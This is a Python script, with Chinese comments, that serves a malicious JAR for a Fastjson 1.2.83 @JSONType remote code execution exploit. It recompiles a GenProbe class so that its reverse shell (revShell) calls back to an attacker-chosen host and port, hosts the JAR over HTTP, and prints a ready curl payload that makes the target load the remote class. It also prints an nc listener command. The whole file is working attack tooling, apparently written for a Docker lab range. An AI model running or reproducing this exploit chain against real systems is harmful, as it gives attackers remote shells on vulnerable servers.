#!/usr/bin/env python3
"""
Fastjson 1.2.83 @JSONType RCE - 恶意 JAR 文件 HTTP 服务器

用法:
    python3 serve.py [--port PORT] [--dir DIRECTORY] [--cb-host HOST] [--cb-port PORT]

默认在 0.0.0.0:19090 上监听，提供当前目录下的 probe。

回调 IP 默认 127.0.0.1:4444，可通过 --cb-host 和 --cb-port 修改（自动重编译）。

配合 payload:
    {"@type":"jar:http:..<INT_IP>:19090.probe!.GenProbe","x":1}

其中 <INT_IP> 是攻击者 IP 的整数形式。
例如 127.0.0.1 = 2130706433, 192.168.1.100 = 3232235876。
"""

import argparse
import http.server
import logging
import os
import socket
import struct
import subprocess
import sys
import tempfile

def get_local_ip() -> str:
    """获取本机非回环 IPv4 地址"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    try:
        import subprocess
        result = subprocess.run(
            ["ifconfig"], capture_output=True, text=True, timeout=3
        )
        for line in result.stdout.split("\n"):
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p == "inet":
                        return parts[i + 1]
    except Exception:
        pass
    return "127.0.0.1"

def get_all_ips() -> list:
    """获取本机所有非回环 IPv4 地址"""
    ips = []
    try:
        import subprocess
        result = subprocess.run(
            ["ifconfig"], capture_output=True, text=True, timeout=3
        )
        for line in result.stdout.split("\n"):
            if "inet " in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p == "inet" and parts[i + 1] != "127.0.0.1":
                        ips.append(parts[i + 1])
    except Exception:
        pass
    return ips

def ip_to_int(ip: str) -> int:
    """将点分十进制 IP 转换为整数"""
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def int_to_ip(n: int) -> str:
    """将整数 IP 转换为点分十进制"""
    return socket.inet_ntoa(struct.pack("!I", n))

class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    """带日志的 HTTP 请求处理器"""
    def log_message(self, format, *args):
        client_ip = self.client_address[0]
        logging.info("[%s] %s", client_ip, format % args)

    def do_GET(self):
        logging.info("收到请求: %s", self.path)
        # 记录请求头信息，用于调试
        for k, v in self.headers.items():
            logging.debug("  %s: %s", k, v)
        super().do_GET()

def build_probe(cb_host: str, cb_port: int, work_dir: str) -> str:
    """
    编译并打包 GenProbe.java，返回 probe JAR 路径。
    如果回调 IP/端口与默认值相同，则使用已有的 probe 文件。
    """
    probe_path = os.path.join(work_dir, "probe")
    src_path = os.path.join(work_dir, "GenProbe.java")

    # 默认值：直接使用已构建的 probe
    if cb_host == "127.0.0.1" and cb_port == 4444:
        if os.path.exists(probe_path):
            print(f"[*] 使用已有的 probe（回调 127.0.0.1:4444）")
            return probe_path
        # 没有已有文件，也需要编译

    print(f"[*] 编译 probe（回调 {cb_host}:{cb_port}）...")

    # 检查 javac
    try:
        subprocess.run(["javac", "-version"], capture_output=True, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print("[!] 未找到 javac，请安装 JDK 或使用默认回调")
        if os.path.exists(probe_path):
            print(f"[*] 回退到已有 probe（回调 127.0.0.1:4444）")
            return probe_path
        sys.exit(1)

    # 检查 fastjson JAR
    fastjson_jar = os.path.join(work_dir, "fastjson-1.2.83.jar")
    if not os.path.exists(fastjson_jar):
        print("[*] 下载 fastjson-1.2.83.jar...")
        subprocess.run([
            "wget", "-q",
            "https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar",
            "-O", fastjson_jar
        ], check=True)

    # 读取源文件，替换回调 IP/端口
    with open(src_path, "r") as f:
        source = f.read()

    source = source.replace('revShell("127.0.0.1", 4444)',
                            f'revShell("{cb_host}", {cb_port})')

    # 写入临时目录并编译
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_src = os.path.join(tmpdir, "GenProbe.java")
        with open(tmp_src, "w") as f:
            f.write(source)

        subprocess.run([
            "javac", "-cp", fastjson_jar, "-d", tmpdir, tmp_src
        ], check=True)

        # 创建 JAR（entry: GenProbe，无 .class 扩展名）
        class_file = os.path.join(tmpdir, "com/alibaba/fastjson/poc/GenProbe.class")
        if not os.path.exists(class_file):
            # 可能 javac 直接输出到 tmpdir 根目录
            class_file = os.path.join(tmpdir, "GenProbe.class")
        class_dir = os.path.dirname(class_file)

        # 用 GenProbe 名称（无 .class）创建 entry
        entry_src = os.path.join(class_dir, "GenProbe")
        os.rename(class_file, entry_src)
        subprocess.run(["jar", "cf", probe_path, "GenProbe"],
                      cwd=class_dir, check=True)

    print(f"[+] 编译完成: {probe_path}")
    return probe_path

def main():
    parser = argparse.ArgumentParser(description="Fastjson RCE JAR 服务器")
    parser.add_argument("--port", type=int, default=19090,
                       help="监听端口 (默认: 19090)")
    parser.add_argument("--dir", type=str, default=".",
                       help="提供文件的目录 (默认: 当前目录)")
    parser.add_argument("--bind", type=str, default="0.0.0.0",
                       help="绑定地址 (默认: 0.0.0.0)")
    parser.add_argument("--ip", type=str,
                       help="显示本机 IP 的整数形式（不启动服务器）")
    parser.add_argument("--cb-host", type=str, default="127.0.0.1",
                       help="回调 IP 地址（默认: 127.0.0.1，自动重编译）")
    parser.add_argument("--cb-port", type=int, default=4444,
                       help="回调端口（默认: 4444，自动重编译）")
    args = parser.parse_args()

    if args.ip:
        n = ip_to_int(args.ip)
        print(f"IP {args.ip} 的整数形式: {n}")
        print(f"验证: {int_to_ip(n)}")
        return

    # 编译 probe（如果回调地址与默认不同）
    work_dir = os.path.abspath(args.dir)
    probe_path = build_probe(args.cb_host, args.cb_port, work_dir)

    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    os.chdir(args.dir)
    server = http.server.HTTPServer(
        (args.bind, args.port),
        LoggingHandler,
    )

    # 显示本机所有 IP 的整数形式
    all_ips = get_all_ips()
    local_ip = get_local_ip()

    print(f"[*] 服务器启动: http://{args.bind}:{args.port}")
    print(f"[*] 提供目录: {os.path.abspath(args.dir)}")
    print(f"[*] 回调地址: {args.cb_host}:{args.cb_port} (nc -lvnp {args.cb_port})")
    print(f"[*] 本机 IP 列表:")
    for ip in all_ips:
        int_ip = ip_to_int(ip)
        mark = " <- 自动选择的 IP" if ip == local_ip else ""
        print(f"      {ip:15} -> {int_ip}{mark}")
    print(f"      {'127.0.0.1':15} -> 2130706433 (仅宿主机本地)")
    print()
    print(f"    [!] 注意: 靶场在 Docker 容器中时，容器内的 127.0.0.1 指向容器自身！")
    print(f"    [!] 请使用宿主机 LAN IP (如 {local_ip if all_ips else '192.168.1.100'}) 的整数形式")
    print(f"    [!] 或使用 --ip 参数手动计算: python3 serve.py --ip <your-ip>")
    print()
    print(f"    Payload 示例 (宿主机 LAN IP):")
    print(f"      curl -X POST -H 'Content-Type: application/json' \\")
    print(f"        --data '{{\"@type\":\"jar:http:..{ip_to_int(local_ip)}:{args.port}.probe!.GenProbe\",\"x\":1}}' \\")
    print(f"        http://target:18080/parse")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.server_close()

if __name__ == "__main__":
    main()